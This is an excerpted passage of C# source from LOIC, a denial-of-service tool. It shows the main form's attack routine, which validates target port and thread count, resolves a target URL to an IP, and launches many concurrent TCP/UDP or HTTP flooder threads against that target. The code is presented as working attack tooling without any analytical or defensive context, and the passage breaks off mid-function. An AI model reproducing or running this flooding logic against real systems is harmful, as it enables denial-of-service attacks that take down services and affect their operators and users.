...
namespace LOIC
{
    public partial class frmMain : Form
    {
        ...
        private static string targetHost, targetIP, sMethod, sData, sSubsite;
        private static int targetPort, numIThreads, iProtocol, iDelay, iTimeout;
        ...
        private void Attack(bool toggle, bool on, bool silent)
        {
            if ((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
            {
                try
                {
                    try { targetPort = Convert.ToInt32(txtPort.Text); }
                    catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }

                    try { numIThreads = Convert.ToInt32(txtThreads.Text); }
                    catch { throw new Exception("What on earth made you put THAT in the threads field?"); }

                    targetIP = txtTarget.Text;
                    if (String.IsNullOrEmpty(targetIP) || String.Equals(targetIP, "N O N E !"))
                        throw new Exception("Select a target.");

                    if (String.IsNullOrEmpty(targetHost)) targetHost = targetIP;
                    if (!targetHost.Contains("://")) targetHost = String.Concat("http://", targetHost);
                    targetHost = new Uri(targetHost).Host;
                ...
                {
                    xxp = new XXPFlooder[numIThreads];
                    for (int a = 0; a < xxp.Length; a++)
                    {
                        xxp[a] = new XXPFlooder(targetIP, targetPort, iProtocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
                        xxp[a].Start();
                    }
                }
                else if (String.Equals(sMethod, "HTTP"))
                {
                    http = new HTTPFlooder[numIThreads];
                    for (int a = 0; a < http.Length; a++)
                    {
                        http[a] = new HTTPFlooder(targetHost, targetIP, targetPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
                        http[a].Start();
                    }
                }
                tShowStats.Start();
        ...
        private void LockOnIP(bool silent)
        {
            ...
            targetHost = txtTargetIP.Text;
        }

        private void LockOnURL(bool silent)
        {
            targetHost = txtTargetURL.Text.ToLower();
            ...
            if (!targetHost.StartsWith("http://") && !targetHost.StartsWith("https://")) targetHost = String.Concat("http://", targetHost);
            try { txtTarget.Text = Dns.GetHostEntry(new Uri(targetHost).Host).AddressList[0].ToString(); }
            catch
            {
                if (silent) return;
                new frmWtf().Show();
